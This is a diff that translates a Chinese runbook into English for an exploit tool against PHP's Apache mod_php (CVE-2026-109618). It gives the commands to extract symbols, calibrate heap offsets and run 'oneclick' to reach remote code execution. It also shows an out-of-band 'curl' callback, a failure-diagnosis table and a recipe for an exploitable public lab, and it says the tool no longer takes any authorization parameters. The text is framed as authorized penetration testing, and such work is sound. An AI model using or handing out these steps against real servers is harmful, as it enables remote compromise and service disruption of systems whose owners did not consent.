@@ -1,70 +1,70 @@
-# 真实授权目标操作手册（CVE-2026-109618）
+# Real Authorized Target Runbook (CVE-2026-109618)
 
-> 适用前提：**书面授权 + 能拿到目标同构建的 `libphp.so`/镜像**。
-> 拿不到同构建二进制时，本工具最多做到 `AFFECTED / NEEDS_CALIBRATION`，不能声称 RCE。
+> Preconditions: **written authorization + access to the target's same-build `libphp.so`/image**.
+> Without the same-build binary, this tool can at most reach `AFFECTED / NEEDS_CALIBRATION` and cannot claim RCE.
 >
-> 本手册只解决「结果可信 + 参数可复现」，不提供任何绕过 WAF、隐藏流量、批量打点的能力。
+> This runbook only addresses "credible results + reproducible parameters"; it does not provide any capability to bypass WAFs, hide traffic, or mass-exploit targets.
 
 ---
 
-## 0. 先确认四件事（缺一就停）
+## 0. Confirm four things first (stop if any is missing)
 
-| # | 要确认 | 怎么确认 |
+| # | What to confirm | How to confirm |
 |---|---|---|
-| 1 | 目标 PHP 在受影响区间 | `recon` 只读；或甲方直接给版本 |
-| 2 | `post_max_size > memory_limit` | 只能在授权窗口内实测；`recon --deep` 或 `scan` |
-| 3 | 入口脚本会 `session_start()` | 响应里有 `PHPSESSID`，或代码审计确认 |
-| 4 | 能拿到同构建 `libphp.so` | 镜像内 `/usr/lib/apache2/modules/libphp.so`，或发行版包 |
+| 1 | Target PHP is in the affected range | `recon` is read-only; or the client provides the version directly |
+| 2 | `post_max_size > memory_limit` | Only measured within the authorized window; `recon --deep` or `scan` |
+| 3 | The entry script calls `session_start()` | `PHPSESSID` is present in the response, or code audit confirms it |
+| 4 | Same-build `libphp.so` is available | `/usr/lib/apache2/modules/libphp.so` inside the image, or the distro package |
 
-运行时还必须是 **Apache prefork + mod_php**。nginx + php-fpm / Apache event 不在当前实现范围内。
+The runtime must also be **Apache prefork + mod_php**. nginx + php-fpm / Apache event are outside the current implementation's scope.
 
 ---
 
-## 1. 从同构建取符号，生成 profile 骨架
+## 1. Extract symbols from the same build and generate a profile skeleton
 
 ```bash
-# 方式 A：目标镜像/容器里直接取
+# Option A: take it directly from the target image/container
 python attack/p2s_ext.py symbols \
   --docker <container>:/usr/lib/apache2/modules/libphp.so \
   --out profiles/target-symbols.json
 
-# 方式 B：已经有 .so 文件
+# Option B: you already have the .so file
 python attack/p2s_ext.py symbols \
   --elf ./libphp-target.so \
   --out profiles/target-symbols.json
 ```
 
-输出里必须看到：
+The output must contain:
 
 ```
 zif_system    = 0x......
 zval_ptr_dtor = 0x......
 ```
 
-这个 profile 里 `calibrated=false`，`ht_size`/`htdata_offset` 仍是 base 值。
-**直接拿它去打会被 oneclick 拒绝（exit 15）——这是故意的。**
+This profile has `calibrated=false`; `ht_size`/`htdata_offset` are still base values.
+**Using it directly will be rejected by oneclick (exit 15) — this is intentional.**
 
 ---
 
-## 2. 只读侦察（零载荷）
+## 2. Read-only reconnaissance (zero payload)
 
 ```bash
 python attack/p2s_ext.py recon -u https://target.example/ --json
 ```
 
-看三件事：`php_version`、有没有 session cookie、`verdict` 是不是 `NEEDS_CALIBRATION` / `RCE_LIKELY`。
+Check three things: `php_version`, whether there is a session cookie, and whether `verdict` is `NEEDS_CALIBRATION` / `RCE_LIKELY`.
 
-> `scan` / `oneclick` 的第一步会发 OOM 载荷（2–24MB），会打死 worker。
-> **只读阶段不要跑 `scan --safe`**：`--safe` 只是跳过堆破坏验证，OOM 探针照发。
+> The first step of `scan` / `oneclick` sends an OOM payload (2–24MB), which will kill the worker.
+> **Do not run `scan --safe` during the read-only phase**: `--safe` only skips heap corruption verification; the OOM probe is still sent.
 
 ---
 
-## 3. 校准（决定能不能打穿的关键）
+## 3. Calibration (the key to whether exploitation succeeds)
 
-`zif/dtor` 由 symbols 确定；剩下三个量必须按目标分配器标定：
-`ht_size`、`htdata_offset`、`stage1_n`/`stage2_t`（不同构建可能不同）。
+`zif/dtor` are determined by symbols; the remaining three quantities must be calibrated against the target allocator:
+`ht_size`, `htdata_offset`, `stage1_n`/`stage2_t` (these may differ between builds).
 
-### 3.1 优先在「同镜像的预发/副本」上校准
+### 3.1 Prefer calibrating on a "staging/copy of the same image"
 
 ```bash
 python attack/p2s_ext.py calibrate \
@@ -75,17 +75,17 @@ python attack/p2s_ext.py calibrate \
   --out profiles/target-cal.json
 ```
 
-成功时输出：
+On success the output is:
 
 ```
-[calibrate] 命中 ht_size=167 htdata=0x690d8；回读=uid=33(www-data) ...
+[calibrate] hit ht_size=167 htdata=0x690d8; readback=uid=33(www-data) ...
 HIT → profiles/target-cal.json
 ```
 
-### 3.2 没有可写目录：用带外回调
+### 3.2 No writable directory: use an out-of-band callback
 
 ```bash
-# 回调域名必须极短：cap=14 时 curl a.co/c1 = 12B
+# The callback domain must be very short: with cap=14, curl a.co/c1 = 12B
 python attack/p2s_ext.py calibrate \
   -u https://staging.example/ \
   --profile profiles/target-symbols.json \
@@ -94,22 +94,22 @@ python attack/p2s_ext.py calibrate \
   --rounds 8
 ```
 
-注意：
+Notes:
 
-- `curl https://...` / 长域名一定超 14B；必须是**短域名 + 80 端口**，或改用可写目录通道。
-- 回调必须在授权范围内，不能用被测方不知情的第三方中转。
+- `curl https://...` / a long domain will definitely exceed 14B; you must use a **short domain + port 80**, or switch to the writable-directory channel.
+- The callback must be within the authorized scope; you may not use a third-party relay unknown to the tested party.
 
-### 3.3 `stage1_n` / `stage2_t` 不对时
+### 3.3 When `stage1_n` / `stage2_t` are wrong
 
-先加 `--stage1-n` 试（例如 841 → 800/900），或对构建用 `--stage2-t` 扫。
-这两个量没有自动扫描器；失败时工具会停在 `Stage-1 泄漏失败` / `Stage-2 泄漏失败`，
-不会误报成功。
+First try adding `--stage1-n` (e.g. 841 → 800/900), or sweep `--stage2-t` for the build.
+There is no automatic scanner for these two quantities; on failure the tool stops at `Stage-1 leak failed` / `Stage-2 leak failed`,
+and will not falsely report success.
 
 ---
 
-## 4. 利用 + 取证（只认内容，不认退出码）
+## 4. Exploitation + forensics (trust content, not exit codes)
 
-### 4.1 webroot 可写（推荐，不需要目标出网）
+### 4.1 Writable webroot (recommended; no outbound network needed on the target)
 
 ```bash
 python attack/p2s_ext.py oneclick \
@@ -120,13 +120,13 @@ python attack/p2s_ext.py oneclick \
   --outdir out
 ```
 
-成功判据（代码里已强制）：
+Success criteria (enforced in code):
 
-- HTTP 回读内容匹配 `uid=\d+`；
-- 且回读内容不等于「随机不存在路径」的软 404 页面；
-- `oneclick_report.json` 里 `rce: true` 且 `proof_body` 有 `uid=`。
+- The HTTP readback content matches `uid=\d+`;
+- and the readback content is not the soft 404 page for a "random nonexistent path";
+- `oneclick_report.json` contains `rce: true` and `proof_body` contains `uid=`.
 
-### 4.2 无写目录：带外回调
+### 4.2 No writable directory: out-of-band callback
 
 ```bash
 python attack/p2s_ext.py oneclick \
@@ -137,10 +137,10 @@ python attack/p2s_ext.py oneclick \
   --outdir out
 ```
 
-成功判据：监听器收到 `path` 里带 token 的请求，并记录来源 IP。
-**没有收到回调 = 没有证据**，不要用 `exit 0` 代替。
+Success criteria: the listener receives a request whose `path` contains the token and records the source IP.
+**No callback received = no evidence**; do not substitute `exit 0`.
 
-### 4.3 容器目录挂载（仅靶场/客户提供挂载时）
+### 4.3 Container directory mount (only when the lab/client provides a mount)
 
 ```bash
 python attack/p2s_ext.py oneclick \
@@ -152,64 +152,64 @@ python attack/p2s_ext.py oneclick \
 
 ---
 
-## 5. 失败矩阵（照着查，不要盲加轮次）
+## 5. Failure matrix (look it up; do not blindly add rounds)
 
-| 停在 | 含义 | 下一步 |
+| Stops at | Meaning | Next step |
 |---|---|---|
-| `Stage-1 泄漏失败` | 版本/构建不对，或 `stage1_n` 不匹配，或没有可 OOM 的 body | 复核 `post_max > memory`；调 `--stage1-n`；确认 sink |
-| `Stage-2 泄漏失败` | `dtor_offset` 不对（symbols 拿错 .so） | 重新 `symbols`，确认 .so 与目标完全同构建 |
-| `Stage-3` 全 miss | `ht_size` / `htdata_offset` 不对 | 回第 3 步校准；不要直接套 bookworm 值 |
-| 回读 404 | webroot 不可写、cwd 不是 docroot、相对路径没落对 | 换 `--collab`，或确认绝对可写目录 |
-| 回读是站点首页 | 软 404 | 工具已排除；若仍命中，检查 `proof_body` 是否真含 `uid=` |
-| `NEEDS_CALIBRATION` | profile 只有符号、没有校准 | 跑第 3 步 |
+| `Stage-1 leak failed` | Wrong version/build, mismatched `stage1_n`, or no OOM-able body | Re-check `post_max > memory`; adjust `--stage1-n`; confirm the sink |
+| `Stage-2 leak failed` | Wrong `dtor_offset` (symbols took the wrong .so) | Re-run `symbols` and confirm the .so is exactly the target build |
+| `Stage-3` all miss | Wrong `ht_size` / `htdata_offset` | Go back to step 3 and calibrate; do not directly apply the bookworm values |
+| Readback 404 | Webroot not writable, cwd is not docroot, or the relative path landed wrong | Switch to `--collab`, or confirm an absolute writable directory |
+| Readback is the site home page | Soft 404 | The tool already excludes it; if it still hits, check whether `proof_body` really contains `uid=` |
+| `NEEDS_CALIBRATION` | Profile has symbols only, no calibration | Run step 3 |
 
 ---
 
-## 6. 仍然做不到的（结构性限制）
+## 6. What still cannot be done (structural limitations)
 
-- **不能对任意真实网站通用**：偏移是按构建的，换镜像就得重来。
-- **不能跨 MPM**：nginx + php-fpm、Apache event 未实现。
-- **单命令 ≤ `ht_size-0x98-1`**（常见 14B）：不能写 webshell、反弹 shell、持久化、横向、清日志。
-- **不能无损探测 `post_max_size`**：只能实测 OOM 或推断。
-- **不能隐藏**：OOM 会在目标 access/error log 留下 `POST`、`zend_mm_heap corrupted`、`SIGSEGV`。
+- **Not universal for arbitrary real websites**: offsets are per-build; a different image means starting over.
+- **Not cross-MPM**: nginx + php-fpm and Apache event are not implemented.
+- **Single command ≤ `ht_size-0x98-1`** (commonly 14B): cannot write a webshell, reverse shell, persist, move laterally, or clear logs.
+- **Cannot probe `post_max_size` non-destructively**: can only measure OOM or infer.
+- **Cannot hide**: OOM leaves `POST`, `zend_mm_heap corrupted`, and `SIGSEGV` in the target's access/error log.
 
 ---
 
-## 7. 自有公网靶场：和 localhost 的差异
+## 7. Your own public lab: differences from localhost
 
-如果靶场是你自己部署在公网的（不是客户生产），目标是验证真实网络路径，按下面固定变量。
+If the lab is deployed by you on the public internet (not client production) and the goal is to validate the real network path, fix the variables below.
 
-> 现在没有任何范围/授权参数：公网靶场直接给 URL 即可。
-> 仍然只对你自己的资产使用。
+> There are no scope/authorization parameters now: for a public lab, just provide the URL.
+> Still use it only against your own assets.
 
-### 7.1 先固定变量（强烈建议）
+### 7.1 Fix the variables first (strongly recommended)
 
-- **单 worker**：prefork `StartServers 1`、`MinSpareServers 1`、`MaxSpareServers 1`、`MaxRequestWorkers 1`。
-  这一步让「泄漏所在的 worker」和「Stage-3 落点的 worker」可确定，排除多 worker 干扰。
-- **同构建**：选 `php:8.4.26-apache`。你表里只有这一行是 `RCE_READY`；
-  `8.2.12` 只能 crash（README §25 标为 `KNOWN_NO_RCE`），`8.2.35` 是修复版。
-- **配置**：`post_max_size=64M`、`memory_limit=8M`、`session.upload_progress.enabled=1`。
-- **入口**：一个会调 `session_start()` 的脚本。
-- **回读**：webroot 可写（`--http-read`），或把 `/out` 挂到宿主机（工具跑在宿主机）。
-- **防火墙**：只放行你的出口 IP。这是一个真实可利用的 PHP，窗口期内会被别人扫到。
+- **Single worker**: prefork `StartServers 1`, `MinSpareServers 1`, `MaxSpareServers 1`, `MaxRequestWorkers 1`.
+  This makes the "worker where the leak happens" and the "worker where Stage-3 lands" deterministic, eliminating multi-worker interference.
+- **Same build**: choose `php:8.4.26-apache`. In your table only this row is `RCE_READY`;
+  `8.2.12` can only crash (README §25 marks it `KNOWN_NO_RCE`), and `8.2.35` is the patched version.
+- **Configuration**: `post_max_size=64M`, `memory_limit=8M`, `session.upload_progress.enabled=1`.
+- **Entry point**: a script that calls `session_start()`.
+- **Readback**: writable webroot (`--http-read`), or mount `/out` on the host (the tool runs on the host).
+- **Firewall**: allow only your egress IP. This is a genuinely exploitable PHP, and others will scan it during the window.
 
 ### 7.2 ASLR
 
-- 先保持默认（开启）跑：Stage-1/2 能打印出 `chunk_base` / `libphp_base`，就说明泄漏原语在 ASLR 下成立。
-- 如果泄漏成功但 Stage-3 全 miss：先确认单 worker；仍失败再校准 `htdata_offset`。
-- 不要为了复现实验室直接关宿主 ASLR——那会掩盖真实环境里的问题。
+- First run with the default (enabled): if Stage-1/2 print `chunk_base` / `libphp_base`, the leak primitive works under ASLR.
+- If the leak succeeds but Stage-3 fully misses: first confirm a single worker; if it still fails, calibrate `htdata_offset`.
+- Do not disable host ASLR just to reproduce the lab — that would mask problems in the real environment.
 
-### 7.3 网络
+### 7.3 Network
 
-| 场景 | 命令要点 |
+| Scenario | Command essentials |
 |---|---|
-| 工具跑在笔记本 | `--http-read https://range/`；`--timeout 120`；**用域名访问**（本机 hosts 把域名指到靶场 IP），这样 Host/SNI 都对 |
-| 工具跑在 VPS 宿主机 | `--dir /out --local-dir /srv/lab/out`，最稳，不受 WAN 上行影响 |
-| 自签 TLS | 加 `--insecure` |
-| 按 IP 直打且 vhost 只认域名 | 仅 `php2shell.py exploit` 支持 `--host-header range.example.com`；`oneclick`/`scan` 请改用域名 |
-| 上行较慢 | 12MB body 至少需要 ~2Mbps 才在 120s 内发完 |
+| Tool runs on a laptop | `--http-read https://range/`; `--timeout 120`; **access via domain name** (point the domain to the lab IP in the local hosts file) so Host/SNI are both correct |
+| Tool runs on the VPS host | `--dir /out --local-dir /srv/lab/out`, most stable, unaffected by WAN upstream |
+| Self-signed TLS | Add `--insecure` |
+| Hitting by IP directly while the vhost only accepts a domain | Only `php2shell.py exploit` supports `--host-header range.example.com`; for `oneclick`/`scan` use the domain instead |
+| Slow upstream | A 12MB body needs at least ~2Mbps to finish sending within 120s |
 
-### 7.4 最稳的一条命令（工具在宿主机、`/out` 已挂载）
+### 7.4 The most stable single command (tool on the host, `/out` already mounted)
 
 ```bash
 python attack/p2s_ext.py oneclick \
@@ -219,11 +219,11 @@ python attack/p2s_ext.py oneclick \
   --rounds 8 --timeout 120 --force
 ```
 
-成功判据：`oneclick_report.json` 里 `rce: true`，且 `proof_body` 含 `uid=`。
-只看退出码不算。
+Success criteria: `oneclick_report.json` contains `rce: true` and `proof_body` contains `uid=`.
+The exit code alone does not count.
 
-### 7.5 公网靶场的额外风险
+### 7.5 Extra risks of a public lab
 
-- 漏洞窗口内可能被别人先打；测完立即下线或升级到 8.4.27。
-- 靶场里不要放真实凭据/数据；OOM 会打崩 worker，属于可感知行为。
-- 如果只是验证工具，优先 `http-read` + 单 worker + 只放行自己 IP，不要把它做成长期在线服务。
+- Someone else may hit the vulnerable window first; take it down or upgrade to 8.4.27 immediately after testing.
+- Do not put real credentials/data in the lab; OOM crashes the worker and is observable behavior.
+- If you are only validating the tool, prefer `http-read` + single worker + allow only your own IP, and do not turn it into a long-running online service.
